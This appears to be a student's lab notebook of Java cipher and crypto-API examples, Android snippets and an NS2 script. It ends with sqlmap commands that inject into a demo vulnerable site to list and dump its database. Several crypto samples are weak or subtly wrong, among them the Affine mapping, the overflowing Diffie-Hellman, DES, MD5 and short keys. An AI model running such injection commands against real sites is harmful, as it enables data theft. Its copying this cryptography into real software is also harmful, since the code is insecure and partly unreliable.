# Caesar Cipher

```java

import java.util.Scanner;

public class Caesar {

    public static final String ALPHABET = "abcdefghijklmnopqrstuvwxyz";

    public static String encryptData(String inputStr, int shiftKey) {

        inputStr = inputStr.toLowerCase();

        String encryptStr = "";

        for (int i = 0; i < inputStr.length(); i++) {

            int pos = ALPHABET.indexOf(inputStr.charAt(i));

            int encryptPos = (shiftKey + pos) % 26;
            char encryptChar = ALPHABET.charAt(encryptPos);

            encryptStr += encryptChar;
        }

        return encryptStr;
    }

    public static String decryptData(String inputStr, int shiftKey) {

        inputStr = inputStr.toLowerCase();

        String decryptStr = "";

        for (int i = 0; i < inputStr.length(); i++) {

            int pos = ALPHABET.indexOf(inputStr.charAt(i));

            int decryptPos = (pos - shiftKey) % 26;

            if (decryptPos < 0) {
                decryptPos = ALPHABET.length() + decryptPos;
            }
            char decryptChar = ALPHABET.charAt(decryptPos);

            decryptStr += decryptChar;
        }

        return decryptStr;
    }

    public static void main(String[] args) {

        Scanner sc = new Scanner(System.in);

        System.out.println("Enter a string for encryption using Caesar Cipher: ");
        String inputStr = sc.nextLine();

        System.out.println("Enter the value by which each character in the plaintext message gets shifted: ");
        int shiftKey = Integer.valueOf(sc.nextLine());

        System.out.println("Encrypted Data ===> " + encryptData(inputStr, shiftKey));
        System.out.println("Decrypted Data ===> " + decryptData(encryptData(inputStr, shiftKey), shiftKey));

        sc.close();
    }
}

```

# Affine Cipher

```java

import java.util.Scanner;

public class Affine {
    public static String encryptionMessage(String Msg) {
        String CTxt = "";
        int a = 3;
        int b = 6;
        for (int i = 0; i < Msg.length(); i++) {
            CTxt = CTxt + (char) ((((a * Msg.charAt(i)) + b) % 26) + 65);
        }
        return CTxt;
    }

    public static String decryptionMessage(String CTxt) {
        String Msg = "";
        int a = 3;
        int b = 6;
        int a_inv = 0;
        int flag = 0;
        for (int i = 0; i < 26; i++) {
            flag = (a * i) % 26;
            if (flag == 1) {
                a_inv = i;
                System.out.println(i);
            }
        }
        for (int i = 0; i < CTxt.length(); i++) {
            Msg = Msg + (char) (((a_inv * ((CTxt.charAt(i) - b)) % 26)) + 65);
        }
        return Msg;
    }

    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        System.out.println("Enter the message: ");
        String message = sc.next();
        System.out.println("Message is :" + message);
        System.out.println("Encrypted Message is : "
                + encryptionMessage(message));
        System.out.println("Decrypted Message is: "
                + decryptionMessage(encryptionMessage(message)));
        sc.close();
    }
}

```

# Hill Cipher

```java

class HillCipher {
    /* 3x3 key matrix for 3 characters at once */
    public static int[][] keymat = new int[][] { { 1, 2, 1 }, { 2, 3, 2 },
            { 2, 2, 1 } }; /* key inverse matrix */
    public static int[][] invkeymat = new int[][] { { -1, 0, 1 }, { 2, -1, 0 }, { -2, 2, -1
    } };
    public static String key = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

    private static String encode(char a, char b, char c) {
        String ret = "";
        int x, y, z;
        int posa = (int) a - 65;
        int posb = (int) b - 65;
        int posc = (int) c - 65;
        x = posa * keymat[0][0] + posb * keymat[1][0] + posc * keymat[2][0];
        y = posa * keymat[0][1] + posb * keymat[1][1] + posc * keymat[2][1];
        z = posa * keymat[0][2] + posb * keymat[1][2] + posc * keymat[2][2];
        a = key.charAt(x % 26);
        b = key.charAt(y % 26);
        c = key.charAt(z % 26);
        ret = "" + a + b + c;
        return ret;
    }

    private static String decode(char a, char b, char c) {
        String ret = "";
        int x, y, z;
        int posa = (int) a - 65;
        int posb = (int) b - 65;
        int posc = (int) c - 65;
        x = posa * invkeymat[0][0] + posb * invkeymat[1][0] + posc *
                invkeymat[2][0];
        y = posa * invkeymat[0][1] + posb * invkeymat[1][1] + posc *
                invkeymat[2][1];
        z = posa * invkeymat[0][2] + posb * invkeymat[1][2] + posc *
                invkeymat[2][2];
        a = key.charAt((x % 26 < 0) ? (26 + x % 26) : (x % 26));
        b = key.charAt((y % 26 < 0) ? (26 + y % 26) : (y % 26));
        c = key.charAt((z % 26 < 0) ? (26 + z % 26) : (z % 26));
        ret = "" + a + b + c;
        return ret;
    }

    public static void main(String[] args) throws java.lang.Exception {
        String msg;
        String enc = "";
        String dec = "";
        int n;
        msg = ("meowman");
        System.out.println("simulation of Hill Cipher\n-------------------------");
        System.out.println("Input message : " + msg);
        msg = msg.toUpperCase();
        msg = msg.replaceAll("\\s", "");
        /* remove spaces */ n = msg.length() % 3;
        /* append padding text X */ if (n != 0) {
            for (int i = 1; i <= (3 - n); i++) {
                msg += 'X';
            }
        }
        System.out.println("padded message : " + msg);
        char[] pdchars = msg.toCharArray();
        for (int i = 0; i < msg.length(); i += 3) {
            enc += encode(pdchars[i], pdchars[i + 1], pdchars[i + 2]);
        }
        System.out.println("encoded message : " + enc);
        char[] dechars = enc.toCharArray();
        for (int i = 0; i < enc.length(); i += 3) {
            dec += decode(dechars[i], dechars[i + 1], dechars[i + 2]);
        }
        System.out.println("decoded message : " + dec);
    }
}

```

# Transposition Cipher

```java

public class Transposition {
    // the most simplest code for transposition cipher
    public static String encrypt(String plainText, int key) {
        char[][] railMatrix = new char[key][plainText.length()];
        for (int i = 0; i < railMatrix.length; i++) {
            for (int j = 0; j < railMatrix[i].length; j++) {
                railMatrix[i][j] = '\n';
            }
        }
        boolean down = false;
        int row = 0, col = 0;
        for (int i = 0; i < plainText.length(); i++) {
            if (row == 0 || row == key - 1) {
                down = !down;
            }
            railMatrix[row][col++] = plainText.charAt(i);
            if (down) {
                row++;
            } else {
                row--;
            }
        }
        String cipherText = "";
        for (int i = 0; i < key; i++) {
            for (int j = 0; j < plainText.length(); j++) {
                if (railMatrix[i][j] != '\n') {
                    cipherText += railMatrix[i][j];
                }
            }
        }
        return cipherText;
    }

    public static String decrypt(String cipherText, int key) {
        char[][] railMatrix = new char[key][cipherText.length()];
        for (int i = 0; i < railMatrix.length; i++) {
            for (int j = 0; j < railMatrix[i].length; j++) {
                railMatrix[i][j] = '\n';
            }
        }
        boolean down = false;
        int row = 0, col = 0;
        for (int i = 0; i < cipherText.length(); i++) {
            if (row == 0 || row == key - 1) {
                down = !down;
            }
            railMatrix[row][col++] = '*';
            if (down) {
                row++;
            } else {
                row--;
            }
        }
        int index = 0;
        for (int i = 0; i < key; i++) {
            for (int j = 0; j < cipherText.length(); j++) {
                if (railMatrix[i][j] == '*' && index < cipherText.length()) {
                    railMatrix[i][j] = cipherText.charAt(index++);
                }
            }
        }
        String plainText = "";
        row = 0;
        col = 0;
        for (int i = 0; i < cipherText.length(); i++) {
            if (row == 0 || row == key - 1) {
                down = !down;
            }
            if (railMatrix[row][col] != '*') {
                plainText += railMatrix[row][col++];
            }
            if (down) {
                row++;
            } else {
                row--;
            }
        }
        return plainText;
    }

    public static void main(String[] args) {
        String plainText = "Hello World";
        int key = 3;
        String cipherText = encrypt(plainText, key);
        System.out.println("Plain Text: " + plainText);
        System.out.println("Cipher Text: " + cipherText);
        System.out.println("Plain Text: " + decrypt(cipherText, key));
    }
}

```

# Bruteforce Attack on Caesar Cipher

```java

void bruteforce() {
    Scanner sc = new Scanner(System.in);
    System.out.print("Enter the String : ");
    String ip = sc.nextLine();
    input = ip.toCharArray();
    for(key=1;key<27;key++) {
        for(int i=0;i<input.length;i++) {
            if(input[i] == ' ')
                continue;
            else {
                if(input[i] >='A' && input[i] <='Z') {
                    input[i] = (char) (input[i] - key);
                    if(input[i] < 'A') {
                        input[i] = (char) (input[i] + 26);
                    }
                }
                else {
                    input[i] = (char) (input[i] - key);
                    if(input[i] < 'a')
                    {
                        input[i] = (char) (input[i] + 26);
                    }
                }
            }
        }
        System.out.println("Key = " + key + " Decrypted String : " + String.valueOf(input));
        input = ip.toCharArray();
    }
}

```

# DES

```java

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;

import java.util.Base64;

class DES {

    private final SecretKey key;
    private Cipher encCipher;
    private Cipher decCipher;

    public DES() throws Exception {
        this.key = generateKey();
        initCiphers();
    }

    public DES(SecretKey key) throws Exception {
        this.key = key;
        initCiphers();
    }

    private void initCiphers() throws Exception {
        encCipher = Cipher.getInstance("DES/CBC/PKCS5Padding");
        decCipher = Cipher.getInstance("DES/CBC/PKCS5Padding");
        encCipher.init(Cipher.ENCRYPT_MODE, key);
        decCipher.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(encCipher.getIV()));
    }

    public byte[] encrypt(String message) throws Exception {
        return encCipher.doFinal(message.getBytes());
    }

    public String decryt(byte[] messsage) throws Exception {
        return new String(decCipher.doFinal(messsage));
    }

    public static SecretKey generateKey() throws Exception {
        return KeyGenerator.getInstance("DES").generateKey();
    }
}

public class DESExecute {

    public static void main(String[] args) throws Exception {

        SecretKey key = DES.generateKey();
        System.out.print("Encrypt/Decrypt Key: ");
        System.out.println(encode(key.getEncoded()));
        System.out.println();

        String message = "The X Coders";

        DES des = new DES(key);
        String encryptedMessage = encode(des.encrypt(message));
        System.out.println("Encrypted Message: " + encryptedMessage);
        System.out.println("Decrypted Message: " + des.decryt(decoder(encryptedMessage)));

    }

    public static String encode(byte[] data) {
        return Base64.getEncoder().encodeToString(data);
    }

    public static byte[] decoder(String data) {
        return Base64.getDecoder().decode(data);
    }
}

```

# AES

```java

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import java.util.Base64;

public class AES {
    private SecretKey key;
    private final int KEY_SIZE = 128;
    private final int T_LEN = 128;
    private Cipher encryptionCipher;

    public void init() throws Exception {
        KeyGenerator generator = KeyGenerator.getInstance("AES");
        generator.init(KEY_SIZE);
        key = generator.generateKey();
    }

    public String encrypt(String message) throws Exception {
        byte[] messageInBytes = message.getBytes();
        encryptionCipher = Cipher.getInstance("AES/GCM/NoPadding");
        encryptionCipher.init(Cipher.ENCRYPT_MODE, key);
        byte[] encryptedBytes = encryptionCipher.doFinal(messageInBytes);
        return encode(encryptedBytes);
    }

    public String decrypt(String encryptedMessage) throws Exception {
        byte[] messageInBytes = decode(encryptedMessage);
        Cipher decryptionCipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec spec = new GCMParameterSpec(T_LEN, encryptionCipher.getIV());
        decryptionCipher.init(Cipher.DECRYPT_MODE, key, spec);
        byte[] decryptedBytes = decryptionCipher.doFinal(messageInBytes);
        return new String(decryptedBytes);
    }

    private String encode(byte[] data) {
        return Base64.getEncoder().encodeToString(data);
    }

    private byte[] decode(String data) {
        return Base64.getDecoder().decode(data);
    }

    public static void main(String[] args) {
        try {
            AES aes = new AES();
            aes.init();
            String encryptedMessage = aes.encrypt("TheXCoders");
            String decryptedMessage = aes.decrypt(encryptedMessage);

            System.err.println("Encrypted Message : " + encryptedMessage);
            System.err.println("Decrypted Message : " + decryptedMessage);
        } catch (Exception ignored) {
        }
    }
}

```

# RSA

```java

import javax.crypto.Cipher;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.util.Base64;

public class RSA {

    private PrivateKey privateKey;
    private PublicKey publicKey;

    public RSA() {
        try {
            KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
            generator.initialize(1024);
            KeyPair pair = generator.generateKeyPair();
            privateKey = pair.getPrivate();
            publicKey = pair.getPublic();
        } catch (Exception ignored) {
        }
    }

    public String encrypt(String message) throws Exception{
        byte[] messageToBytes = message.getBytes();
        Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
        cipher.init(Cipher.ENCRYPT_MODE,publicKey);
        byte[] encryptedBytes = cipher.doFinal(messageToBytes);
        return encode(encryptedBytes);
    }
    private String encode(byte[] data){
        return Base64.getEncoder().encodeToString(data);
    }

    public String decrypt(String encryptedMessage) throws Exception{
        byte[] encryptedBytes = decode(encryptedMessage);
        Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
        cipher.init(Cipher.DECRYPT_MODE,privateKey);
        byte[] decryptedMessage = cipher.doFinal(encryptedBytes);
        return new String(decryptedMessage,"UTF8");
    }
    private byte[] decode(String data){
        return Base64.getDecoder().decode(data);
    }

    public static void main(String[] args) {
        RSA rsa = new RSA();
        try{
            String encryptedMessage = rsa.encrypt("Hello World");
            String decryptedMessage = rsa.decrypt(encryptedMessage);

            System.err.println("Encrypted:\n"+encryptedMessage);
            System.err.println("Decrypted:\n"+decryptedMessage);
        }catch (Exception ingored){}
    }
}

```

# SHA

```java

import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

class SHA {
    public static byte[] getSHA(String input) throws NoSuchAlgorithmException {
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        return md.digest(input.getBytes(StandardCharsets.UTF_8));
    }

    public static String toHexString(byte[] hash) {
        BigInteger number = new BigInteger(1, hash);

        StringBuilder hexString = new StringBuilder(number.toString(16));

        while (hexString.length() < 64) {
            hexString.insert(0, '0');
        }

        return hexString.toString();
    }

    public static void main(String args[]) {
        try {
            String string = "Meow Meow";
            System.out.println(string + " : " + toHexString(getSHA(string)));
        }

        catch (NoSuchAlgorithmException e) {
            System.out.println("Exception thrown for incorrect algorithm: " + e);
        }
    }
}

```

# MD5

```java

import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class MD5 {
    public static String getMd5(String input) {
        try {

            MessageDigest md = MessageDigest.getInstance("MD5");

            byte[] messageDigest = md.digest(input.getBytes());

            BigInteger no = new BigInteger(1, messageDigest);

            String hashtext = no.toString(16);
            while (hashtext.length() < 32) {
                hashtext = "0" + hashtext;
            }
            return hashtext;
        }

        catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        }
    }

    public static void main(String args[]) throws NoSuchAlgorithmException {
        String s = "Meow Meow";
        System.out.println("Your HashCode Generated by MD5 is: " + getMd5(s));
    }
}

```

# DSA

```java

import java.security.*;

public class DSA {

    public static void main(String args[]) {
        try {
            SignerUser signer = new SignerUser();
            String message = "Every sunset give us one day less to live. But every sunrise give uso ne day more to hope.";

            byte[] sign = signMessage(message.getBytes(), signer.getPrivateKey());

            PublicKey pubKey = signer.getPubKey();

            System.out.println("--- Example with a valid signature ---");
            validateMessageSignature(pubKey, message.getBytes(), sign);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void validateMessageSignature(PublicKey publicKey, byte[] message, byte[] signature)
            throws Exception {
        Signature clientSig = Signature.getInstance("DSA");
        clientSig.initVerify(publicKey);
        clientSig.update(message);
        if (clientSig.verify(signature)) {
            System.out.println("The message is properly signed.");
        } else {
            System.err.println("It is not possible to validate the signature.");
        }
    }

    public static byte[] signMessage(byte[] message, PrivateKey privateKey) throws Exception {
        Signature sig = Signature.getInstance("DSA");
        sig.initSign(privateKey);
        sig.update(message);
        byte[] sign = sig.sign();
        return sign;
    }

    public static class SignerUser {
        private PublicKey publicKey;
        private PrivateKey privateKey;

        public PublicKey getPubKey() {
            return publicKey;
        }

        public SignerUser() throws NoSuchAlgorithmException {
            KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
            SecureRandom secRan = new SecureRandom();
            kpg.initialize(512, secRan);
            KeyPair keyP = kpg.generateKeyPair();
            this.publicKey = keyP.getPublic();
            this.privateKey = keyP.getPrivate();
        }

        public PublicKey getPublicKey() {
            return publicKey;
        }

        public void setPublicKey(PublicKey publicKey) {
            this.publicKey = publicKey;
        }

        public PrivateKey getPrivateKey() {
            return privateKey;
        }

        public void setPrivateKey(PrivateKey privateKey) {
            this.privateKey = privateKey;
        }

    }
}

```

# Diffie Hellman

```java

import java.util.*;

public class Diffie {

    public static void main(String[] args) {
        long P, G, x, a, y, b, ka, kb;
        Scanner sc = new Scanner(System.in);
        System.out.println("Both the users should be agreed upon the public keys G and P");
        System.out.println("Enter value for public key G:");
        G = sc.nextLong();
        System.out.println("Enter value for public key P:");
        P = sc.nextLong();
        System.out.println("Enter value for private key a selected by user1:");
        a = sc.nextLong();
        System.out.println("Enter value for private key b selected by user2:");
        b = sc.nextLong();

        x = calculatePower(G, a, P);
        y = calculatePower(G, b, P);
        ka = calculatePower(y, a, P);
        kb = calculatePower(x, b, P);
        System.out.println("Secret key for User1 is:" + ka);
        System.out.println("Secret key for User2 is:" + kb);
    }

    private static long calculatePower(long x, long y, long P) {
        long result = 0;
        if (y == 1) {
            return x;
        } else {
            result = ((long) Math.pow(x, y)) % P;
            return result;
        }
    }
}

```

# File Operations

```java

import java.io.*;
import java.util.*;

void writeToFile(String s) {
    try {
        FileWriter myWriter = new FileWriter("filename.txt");
        myWriter.write(s);
        myWriter.close();
        System.out.println("Successfully wrote to the file.");
    } catch (IOException e) {
        System.out.println("An error occurred.");
        e.printStackTrace();
    }
}

String readFromFile() {
    String s = "";
    try {
        File myObj = new File("filename.txt");
        Scanner myReader = new Scanner(myObj);
        while (myReader.hasNextLine()) {
            s = myReader.nextLine();
        }
        myReader.close();
    } catch (FileNotFoundException e) {
        System.out.println("An error occurred.");
        e.printStackTrace();
    }
    return s;
}

```

# Android

## res/values/strings.xml

```xml
<?xml version = "1.0" encoding = "utf-8"?>
<resources>
   <string name = "app_name">Tutorialspoint</string>
</resources>
```

## AndroidManifest.xml

```xml
<?xml version = "1.0" encoding = "utf-8"?>
<manifest xmlns:android = "http://schemas.android.com/apk/res/android"
   package = "com.example.tutorialspoint7.myapplication">
   <uses-permission android:name = "android.permission.ACCESS_FINE_LOCATION" />
   <uses-permission android:name = "android.permission.INTERNET" />
   <application
      android:allowBackup = "true"
      android:icon = "@mipmap/ic_launcher"
      android:label = "@string/app_name"
      android:supportsRtl = "true"
      android:theme = "@style/AppTheme">

      <activity android:name = ".MainActivity">
         <intent-filter>
            <action android:name = "android.intent.action.MAIN" />

            <category android:name = "android.intent.category.LAUNCHER" />
         </intent-filter>
      </activity>
   </application>

</manifest>
```

## Event

```java
package com.example.tharunoptimus.meow;

import android.app.ProgressDialog;
import android.os.Bundle;
import android.support.v7.app.ActionBarActivity;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

public class MainActivity extends ActionBarActivity {
   private ProgressDialog progress;
   Button b1,b2;

   @Override
   protected void onCreate(Bundle savedInstanceState) {
      super.onCreate(savedInstanceState);
      setContentView(R.layout.activity_main);
      progress = new ProgressDialog(this);

      b1=(Button)findViewById(R.id.button);
      b2=(Button)findViewById(R.id.button2);
      b1.setOnClickListener(new View.OnClickListener() {

         @Override
         public void onClick(View v) {
            TextView txtView = (TextView) findViewById(R.id.textView);
            txtView.setTextSize(25);
         }
      });

      b2.setOnClickListener(new View.OnClickListener() {

         @Override
         public void onClick(View v) {
            TextView txtView = (TextView) findViewById(R.id.textView);
            txtView.setTextSize(55);
         }
      });
   }
}
```

## GPS

```java
package com.example.tharunoptimus.meow;

import android.app.AlertDialog;
import android.app.Service;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

public class GPSTracker extends Service implements LocationListener {

    private final Context mContext;

    
    boolean isGPSEnabled = false;

    
    boolean isNetworkEnabled = false;

    
    boolean canGetLocation = false;

    Location location; 
    double latitude; 
    double longitude; 

    
    private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 10; 

    
    private static final long MIN_TIME_BW_UPDATES = 1000 * 60 * 1; 

    
    protected LocationManager locationManager;

    public GPSTracker(Context context) {
        this.mContext = context;
        getLocation();
    }

    public Location getLocation() {
        try {
            locationManager = (LocationManager) mContext.getSystemService(LOCATION_SERVICE);        
            isGPSEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);    
            isNetworkEnabled = locationManager
                .isProviderEnabled(LocationManager.NETWORK_PROVIDER);

            if (!isGPSEnabled && !isNetworkEnabled) {
                
            } else {
                this.canGetLocation = true;
                
                if (isNetworkEnabled) {
                locationManager.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    MIN_TIME_BW_UPDATES,
                    MIN_DISTANCE_CHANGE_FOR_UPDATES, this);

                Log.d("Network", "Network");
                if (locationManager != null) {
                    location = locationManager
                        .getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

                    if (location != null) {
                        latitude = location.getLatitude();
                        longitude = location.getLongitude();
                    }
                }
                }
       
                if (isGPSEnabled) {
                if (location == null) {
                    locationManager.requestLocationUpdates(
                        LocationManager.GPS_PROVIDER,
                        MIN_TIME_BW_UPDATES,
                        MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
                    Log.d("GPS Enabled", "GPS Enabled");
                    if (locationManager != null) {
                        location = locationManager
                            .getLastKnownLocation(LocationManager.GPS_PROVIDER);

                        if (location != null) {
                            latitude = location.getLatitude();
                            longitude = location.getLongitude();
                        }
                    }
                }
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

        return location;
    }

    public void stopUsingGPS(){
        if(locationManager != null){
            locationManager.removeUpdates(GPSTracker.this);
        }
    }

    public double getLatitude(){
        if(location != null){
            latitude = location.getLatitude();
        }

        
        return latitude;
    }
 
    public double getLongitude(){
        if(location != null){
            longitude = location.getLongitude();
        }        
        return longitude;
    }

    public boolean canGetLocation() {
        return this.canGetLocation;
    }

    public void showSettingsAlert(){
        AlertDialog.Builder alertDialog = new AlertDialog.Builder(mContext);

        
        alertDialog.setTitle("GPS is settings");

        
        alertDialog.setMessage("GPS is not enabled. Do you want to go to settings menu?");

        
        alertDialog.setPositiveButton("Settings", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog,int which) {
                Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                mContext.startActivity(intent);
            }
        });

        
        alertDialog.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
                dialog.cancel();
            }
        });

        
        alertDialog.show();
    }

    @Override
    public void onLocationChanged(Location location) {
    }

    @Override
    public void onProviderDisabled(String provider) {
    }

    @Override
    public void onProviderEnabled(String provider) {
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {
    }

    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }
}
```

## Location

```java
package com.example.tharunoptimus.meow;

import android.Manifest;
import android.app.Activity;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.test.mock.MockPackageManager;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends Activity {

   Button btnShowLocation;
   private static final int REQUEST_CODE_PERMISSION = 2;
   String mPermission = Manifest.permission.ACCESS_FINE_LOCATION;

   GPSTracker gps;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        try {
            if (ActivityCompat.checkSelfPermission(this, mPermission)
                != MockPackageManager.PERMISSION_GRANTED) {

                ActivityCompat.requestPermissions(this, new String[]{mPermission},
                REQUEST_CODE_PERMISSION);

            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        btnShowLocation = (Button) findViewById(R.id.button);      
        btnShowLocation.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View arg0) {
                gps = new GPSTracker(MainActivity.this);
                if(gps.canGetLocation()){
                double latitude = gps.getLatitude();
                double longitude = gps.getLongitude();
                Toast.makeText(getApplicationContext(), "Your Location is - \nLat: "
                    + latitude + "\nLong: " + longitude, Toast.LENGTH_LONG).show();
                }else{
                gps.showSettingsAlert();
                }

            }
        });
    }
}
```

## Push

```java
package com.example.tharunoptimus.meowapp;

import android.app.Notification;
import android.app.NotificationManager;

import android.content.Context;
import android.support.v7.app.ActionBarActivity;
import android.os.Bundle;
import android.view.View;

import android.widget.Button;
import android.widget.EditText;

public class MainActivity extends ActionBarActivity {
   EditText ed1,ed2,ed3;
   protected void onCreate(Bundle savedInstanceState) {
      super.onCreate(savedInstanceState);
      setContentView(R.layout.activity_main);

      ed1=(EditText)findViewById(R.id.editText);
      ed2=(EditText)findViewById(R.id.editText2);
      ed3=(EditText)findViewById(R.id.editText3);
      Button b1=(Button)findViewById(R.id.button);

      b1.setOnClickListener(new View.OnClickListener() {
         @Override
         public void onClick(View v) {
            String tittle=ed1.getText().toString().trim();
            String subject=ed2.getText().toString().trim();
            String body=ed3.getText().toString().trim();

            NotificationManager notif=(NotificationManager)getSystemService(Context.NOTIFICATION_SERVICE);
            Notification notify=new Notification.Builder
               (getApplicationContext()).setContentTitle(tittle).setContentText(body).
               setContentTitle(subject).setSmallIcon(R.drawable.abc).build();

               notify.flags |= Notification.FLAG_AUTO_CANCEL;
               notif.notify(0, notify);
         }
      });
   }
}
```

# TCP NS2

`ns myprogram.tcl 20`

```bash
#Set the simulator
set ns [new Simulator]

#Opening the network animation
set namf [open wired2.nam w]
$ns namtrace-all $namf

#open the file for tracing
set tracef [open wired2.tr w]
$ns trace-all $tracef

#creation of wired nodes
set n0 [$ns node]
set n1 [$ns node]
set n2 [$ns node]
set n3 [$ns node]

#establish the links between the nodes with bandwidth and delay
$ns duplex-link $n0 $n1 2MB 1ms DropTail
$ns duplex-link $n1 $n2 2.5MB 1ms RED
$ns duplex-link $n2 $n3 2MB 1.5ms DropTail
$ns duplex-link $n3 $n1 12MB 10ms DropTail

#creating the Tcp source and sink agents
set tcp [new Agent/TCP]
set sink [new Agent/TCPSink]

#attach the agents to the corresponding nodes
$ns attach-agent $n0 $tcp
$ns attach-agent $n2 $sink

#create the FTP Traffic
set ftp [new Application/FTP]
$ftp attach-agent $tcp
$ns connect $tcp $sink

#start the traffic
$ns at 1.0 "$ftp start"

#end the simulation
$ns at 3.0 "finish"
proc finish {} {
     global ns namf tracef
     $ns flush-trace
     close $namf
     close $tracef
     exec nam wired2.nam &
     exit 0
}
```


## sqlmap

```bash
sqlmap  -h

# Choose a website and list information about databases present
sqlmap  -u  http://testphp.vulnweb.com/listproducts.php?cat=1  --dbs  --random-agent

# List information about tables present in the databases. For example, let’s consider “acuart”

sqlmap  -u  http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables

# List information about columns in particular table

sqlmap  -u  http://testphp.vulnweb.com/listproducts.php?cat=1 -D  acuart  -T  artists  --columns

# Dump available data from the columns

sqlmap  -u  http://testphp.vulnweb.com/listproducts.php?cat=1 -D  acuart  -T  artists  -C  aname  --dump
```